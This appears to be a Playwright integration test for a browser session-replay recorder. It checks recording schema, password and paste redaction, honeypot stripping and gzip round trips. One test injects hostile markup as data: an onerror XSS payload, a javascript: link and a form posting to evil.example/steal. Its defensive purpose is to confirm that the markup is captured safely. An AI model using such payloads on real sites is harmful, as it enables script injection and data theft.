// tests/browser/replay/run-replay-tests.mjs
// Playwright integration suite for the replay recorder — exercises the REAL
// built dist artifacts in a real Chromium against demo-standalone.html.
//
// Run:
//   npm run build && npm run test:browser:replay
// (wired in package.json; uses openclaw's playwright-core via NODE_PATH)
//
// Assertion style: hard throws with labeled messages; the process exit code
// is the pass/fail signal so CI-style wrappers can consume it.

import { createRequire } from 'module';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

// playwright-core resolution, most-local first. The openclaw path is this
// dev machine's documented source (see repo CLAUDE.md); a repo-local
// install or PLAYWRIGHT_CORE_DIR env var beats it. If nothing resolves,
// SKIP with exit 0 — this is an optional browser suite, not a unit gate.
function resolvePlaywright() {
  const candidates = [
    process.env.PLAYWRIGHT_CORE_DIR,
    import.meta.url,                                            // repo node_modules
    '/opt/homebrew/lib/node_modules/openclaw/node_modules/',    // this machine
  ].filter(Boolean);
  for (const base of candidates) {
    try { return createRequire(base)('playwright-core'); } catch { /* next */ }
  }
  return null;
}
const pw = resolvePlaywright();
if (!pw) {
  console.log('SKIP: playwright-core not found (set PLAYWRIGHT_CORE_DIR or npm i -D playwright-core)');
  process.exit(0);
}
const { chromium } = pw;

const here = dirname(fileURLToPath(import.meta.url));
const demoUrl = 'file://' + join(here, 'demo-standalone.html');

let failures = 0;
function check(cond, label) {
  if (cond) { console.log('  ✔ ' + label); }
  else { failures++; console.error('  ✖ ' + label); }
}

const browser = await chromium.launch({ headless: true });
const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
page.on('pageerror', (e) => { failures++; console.error('  ✖ pageerror: ' + e.message); });

console.log('▶ recording a scripted participant session');
await page.goto(demoUrl);
await page.evaluate(() => window.CH_E2E.start());

// ── Trial 1: mouse movement, typing, checkbox, paste, DOM mutations ──
await page.mouse.move(100, 100);
await page.mouse.move(300, 220, { steps: 12 });
await page.mouse.move(500, 300, { steps: 12 });
await page.click('#card-b');
await page.fill('#answer', 'king of hearts');
await page.check('#confident');
await page.fill('#secret', 'hunter2');
// Paste event (synthetic ClipboardEvent — clipboard API needs permissions)
await page.evaluate(() => {
  const dt = new DataTransfer();
  dt.setData('text', 'pasted answer text');
  document.getElementById('answer').dispatchEvent(
    new ClipboardEvent('paste', { clipboardData: dt, bubbles: true }));
});
// Experiment reacts: feedback + card flip (mutations)
await page.evaluate(() => window.CH_E2E.respond());
// Tab-away simulation: window blur + focus
await page.evaluate(() => {
  window.dispatchEvent(new Event('blur'));
  return new Promise(r => setTimeout(r, 120));
});
await page.evaluate(() => window.dispatchEvent(new Event('focus')));

// ── Trial 2 ──
await page.evaluate(() => window.CH_E2E.nextTrial());
await page.mouse.move(200, 400, { steps: 8 });
await page.click('#card-a');
await page.fill('#answer', 'seven of spades');

const recording = await page.evaluate(() => window.CH_E2E.finish());

// The one assertion that survives the rewrite untouched: the scripted session
// drove the REAL dist through a real browser and produced a recording without
// a single page error (the `pageerror` handler above feeds the same counter).
check(!!recording && typeof recording === 'object',
  'the scripted session ran against the built dist and returned a recording');

// ── v2 wire assertions (T3-T5 red window CLOSED here, T5 Task 10(c)) ───────
// These were skipped from T3 (when the recorder moved to SessionRecording v2)
// until T5 (when the viewer followed). They are the SAME eleven claims the
// skip list named, re-pointed at the v2 wire: dotted event types, integer
// node ids, DomNode keyframes, `extensions['cyborg-hunter']` in place of
// `ch_extensions`. Two of them are covered nowhere else and are the reason
// this half had to come back rather than be deleted: adversarial
// participant-injected markup (now the stronger never-parsed claim) and the
// gzip round trip.
console.log('▶ schema + identity');
check(recording.schema_version === 2, 'schema_version is 2');
check(recording.recorder && recording.recorder.name === 'cyborg-hunter-replay',
  'recorder identity names this recorder (v1 stamped a metadata.recorder string)');
check(typeof recording.recorder.version === 'string' && recording.recorder.version.length > 0,
  'recorder version present');
check(recording.participant_id === 'E2E-P1', 'participant_id carried at the top level');
check(recording.end_reason === 'finished', 'end_reason finished');
check(!('metadata' in recording), 'no v1 metadata block survives anywhere on the wire');
const chExt = (recording.extensions || {})['cyborg-hunter'] || {};
check(chExt.tier === 'dom', 'tier recorded in the cyborg-hunter extension');

console.log('▶ segments');
// v1 recorded THREE trials here — an implicit `__session__` first, because the
// guard violation arrived as an EVENT before startTrial and opened a trial for
// itself. §5.8 removed that event type (violations are extension data now), so
// nothing reaches the buffer before the first bracketed segment and the
// implicit segment is correctly absent. The claim is re-pointed, not dropped:
// what the recording says about its own structure must still be true.
check(recording.segments.length === 2,
  'two bracketed segments, no implicit one (' + recording.segments.length + ')');
check(recording.segments[0].label === 'trial-1' && recording.segments[1].label === 'trial-2',
  'segment labels carry the trial ids');
check(recording.segments.every((s, i) => s.index === i), 'segment index equals array position');
const seg1 = recording.segments[0];
const seg2 = recording.segments[1];
check(seg1.initial_dom && typeof seg1.initial_dom === 'object' && seg1.initial_dom.tag === 'body',
  'segment 1 opens a span with a DomNode keyframe (v1 carried an HTML string)');
check(seg2.initial_dom === null,
  'segment 2 is a continuation of the same span, not a second snapshot');

console.log('▶ event vocabulary (dotted types, integer node ids)');
const types = new Set(seg1.events.map(e => e.type));
check(types.has('mouse.move'), 'segment 1 has mouse.move events');
check(types.has('mouse.click'), 'segment 1 has mouse.click events');
check(types.has('input.value') || types.has('key.down'), 'segment 1 has typing evidence');
check(types.has('clipboard.paste'), 'segment 1 has the paste event');
check(types.has('blur') && types.has('focus'), 'segment 1 has blur/focus pair');
check(!seg1.events.some(e => 'kind' in e), 'no v1 `kind` field survives on any event');
check(seg1.events.every(e => typeof e.t === 'number' && isFinite(e.t)), 'every event carries a numeric t');
check(seg1.events.every((e, i, a) => i === 0 || a[i - 1].t <= e.t), 'events are time-sorted');

console.log('▶ DOM mutations arrive as dom.* patches against integer ids');
// v1 recorded `mutation` events carrying HTML fragments. v2 records the
// operation: the feedback text lands as a dom.add of a text node (the element
// was empty, so there was no text node to update), the card flip as a dom.attr.
const patches = seg1.events.filter(e => e.type.startsWith('dom.'));
check(patches.length > 0, 'segment 1 carries dom.* patches (' + patches.length + ')');
// `dom.add` names its insertion point (`parent`, `before`) by id and carries
// the new subtree as a DomNode; every other patch names its target `node`.
check(patches.every(e => e.type === 'dom.add'
  ? Number.isInteger(e.parent) && (e.before === null || Number.isInteger(e.before))
  : Number.isInteger(e.node)),
  'every patch addresses its target by integer id — no selectors, no markup');
const feedbackPatch = patches.find(e => e.type === 'dom.add' &&
  e.node && e.node.kind === 'text' && e.node.text === 'Correct!');
check(!!feedbackPatch, 'the feedback text mutation was captured as a dom.add of a text node');
check(!!patches.find(e => e.type === 'dom.attr' && e.name === 'class' && /flipped/.test(e.value || '')),
  'card class flip captured as a dom.attr patch');

console.log('▶ privacy floors on the wire');
const pasteEv = seg1.events.find(e => e.type === 'clipboard.paste');
check(pasteEv.len === 'pasted answer text'.length, 'paste length only (' + pasteEv.len + ')');
check(pasteEv.text == null && pasteEv.html == null, 'paste content never recorded');
const valueEvents = seg1.events.filter(e => e.type === 'input.value');
const answerInput = valueEvents.filter(e => !e.redacted).pop();
check(!!answerInput && answerInput.value === 'king of hearts', 'input value captured');
const secretInput = valueEvents.filter(e => e.redacted === true).pop();
check(!!secretInput && secretInput.value === undefined,
  'password input redacted unconditionally (no value key)');
check(!!secretInput && secretInput.value_len === 'hunter2'.length, 'password length preserved');
const checkedEv = seg1.events.filter(e => e.type === 'input.checked').pop();
check(!!checkedEv && checkedEv.checked === true, 'checkbox state captured as input.checked');
// The whole-file sentinel: a redaction that holds per-event but leaks through
// some other channel (a keyframe attribute, a patch, an extension block) is
// not a redaction. v1 asserted this per event only.
const wholeFile = JSON.stringify(recording);
check(!wholeFile.includes('hunter2'), 'the password appears NOWHERE in the artifact');
check(!wholeFile.includes('pasted answer text'), 'the pasted text appears NOWHERE in the artifact');

console.log('▶ honeypot cooperation (DomNode stripping)');
const keyframeJson = JSON.stringify(seg1.initial_dom);
check(keyframeJson.length > 100, 'keyframe tree present (' + keyframeJson.length + ' chars)');
check(!keyframeJson.includes('fg-honeypot') && !keyframeJson.includes('fg-ai-bait'),
  'honeypot bait stripped from the keyframe tree');
check(!wholeFile.includes('fg-ai-bait'),
  'honeypot bait never appears in any patch or extension block either');
const baitTagged = await page.evaluate(() =>
  document.querySelectorAll('[data-ch-role="honeypot"]').length);
check(baitTagged >= 3, 'live honeypot elements carry data-ch-role (' + baitTagged + ')');

console.log('▶ extensions["cyborg-hunter"] merge (v1: ch_extensions)');
check(!('ch_extensions' in recording), 'the v1 ch_extensions block is gone');
check(chExt.scoring !== null && typeof chExt.scoring === 'object', 'CH scoring merged from session report');
check(chExt.preset === 'standard', 'preset carried');
check(Array.isArray(chExt.guard_violations), 'guard violations array present');
check(Array.isArray(chExt.capture_failures) && chExt.capture_failures.length === 0,
  'no capture channel went dark during the scripted session');

console.log('▶ guard-friction violation capture (observe mode)');
// v1 recorded a `ch:guard_violation` EVENT with a pre_scramble_dom HTML
// string. §5.8 forbids a vendor event type in the shared stream, so the
// violation moved into the vendor extension — where its pre-scramble snapshot
// is a DomNode tree like every other snapshot.
check(!wholeFile.includes('ch:guard_violation'),
  'no ch:guard_violation event type survives in the stream (§5.8)');
check(chExt.guard_violations.length > 0,
  'guard violation recorded in the extension (' + chExt.guard_violations.length + ')');
const startEv = chExt.guard_violations.find(v => v.phase === 'start');
check(!!startEv && startEv.pre_scramble_dom && typeof startEv.pre_scramble_dom === 'object',
  'violation start carries a DomNode pre-scramble snapshot');
check(startEv && !JSON.stringify(startEv.pre_scramble_dom).includes('guard-friction-overlay'),
  'pre-scramble snapshot does not contain the friction overlay');

console.log('▶ adversarial DOM (participant-injected hostile markup)');
// NOT covered anywhere else — and stronger under v2 than it was under v1.
// v1's defence was escaping: the hostile markup was serialized into an HTML
// string and the string had to survive being parsed again at replay time.
// v2 never produces a string: the participant's DOM arrives as structured
// data, so there is no parse step for a `</script>` to break out of.
const hostile = await page.evaluate(() => {
  const zone = document.createElement('div');
  zone.id = 'hostile';
  zone.innerHTML =
    '<img src="https://evil.example/x.png" onerror="alert(1)">' +
    '<a href="javascript:alert(2)">click</a>' +
    '<form action="https://evil.example/steal"><input id="a:b c" value="v"></form>' +
    '<div>literal </div>';
  zone.querySelector('div').textContent = 'text with </script> inside';
  document.body.appendChild(zone);

  const rec2 = window.CyborgHunterReplay.attach({
    participantId: 'ADV', tier: 'dom', autoSave: { mode: 'none' } });
  rec2.startSession();
  rec2.startTrial({ trialId: 'adv-1' });
  // trigger an input on the weird-id field so the node lands in the stream
  const weird = zone.querySelector('input');
  weird.value = 'typed';
  weird.dispatchEvent(new Event('input', { bubbles: true }));
  return new Promise(resolve => requestAnimationFrame(() => {
    rec2.endTrial();
    rec2.stopSession('finished');
    const r = rec2.getRecording();
    rec2.destroy();
    zone.remove();
    resolve(r);
  }));
});
const advTree = hostile.segments[0].initial_dom;
check(advTree && typeof advTree === 'object' && !Array.isArray(advTree),
  'the hostile page is recorded as a DomNode tree, never as markup');
const advJson = JSON.stringify(advTree);
check(!/"on(error|load|click|mouseover|focus)"\s*:/.test(advJson),
  'handler attributes stripped at capture');
// Walk to the node that carries the hostile text: it must be a TEXT node whose
// value is the literal string. Nothing escapes it, because nothing parses it.
function walk(n, out = []) { out.push(n); (n.children || []).forEach(c => walk(c, out)); return out; }
const advNodes = walk(advTree);
const scriptText = advNodes.find(n => n.kind === 'text' && n.text === 'text with </script> inside');
check(!!scriptText, 'literal </script> arrives verbatim as TEXT-node data, unescaped and unparsed');
const weirdIdNode = advNodes.find(n => n.attrs && n.attrs.id === 'a:b c');
check(!!weirdIdNode, 'selector-unsafe id captured raw as an attribute value');
const advInput = hostile.segments[0].events.find(e => e.type === 'input.value');
check(!!advInput && advInput.node === weirdIdNode.id,
  'the event addresses that node by INTEGER id — no selector is ever built from participant data');
// Fidelity, stated rather than assumed: capture does NOT rewrite a
// `javascript:` href. It is refused at INSTANTIATION by the viewer's §12
// filter (pinned in tests/replay/dom-instantiate.test.js), which is where a
// defence belongs — a recording that silently edits what the page contained
// would be a worse artifact.
const jsHref = advNodes.find(n => n.attrs && /^javascript:/.test(n.attrs.href || ''));
check(!!jsHref, 'a javascript: href is recorded verbatim (the viewer, not capture, refuses it)');

console.log('▶ gzip round-trip');
const gzipInfo = await page.evaluate(async () => {
  const rec2 = window.CyborgHunterReplay.attach({ participantId: 'GZ', autoSave: { mode: 'none' } });
  rec2.startSession();
  rec2.startTrial({ trialId: 'z' });
  rec2.endTrial();
  rec2.stopSession('finished');
  const blob = await rec2.getRecordingCompressed();
  const rawLen = JSON.stringify(rec2.getRecording()).length;
  rec2.destroy();
  if (!blob) return { supported: false };
  if (blob.type !== 'application/gzip') return { supported: false, fallback: true, size: blob.size };
  const ds = new DecompressionStream('gzip');
  const text = await new Response(blob.stream().pipeThrough(ds)).text();
  const parsed = JSON.parse(text);
  return { supported: true, roundTrip: parsed.schema_version === 2,
    recorder: parsed.recorder && parsed.recorder.name, gz: blob.size, raw: rawLen };
});
if (gzipInfo.supported) {
  check(gzipInfo.roundTrip, 'gzip blob decompresses back to schema v2 JSON');
  check(gzipInfo.recorder === 'cyborg-hunter-replay', 'the decompressed artifact is intact');
  check(gzipInfo.gz < gzipInfo.raw, `gzip smaller than raw (${gzipInfo.gz} < ${gzipInfo.raw})`);
} else {
  check(gzipInfo.fallback === true, 'CompressionStream absent — plain fallback Blob produced');
}

await browser.close();

if (failures > 0) {
  console.error(`\n${failures} FAILURE(S)`);
  process.exit(1);
}
console.log('\nAll replay integration checks passed.');
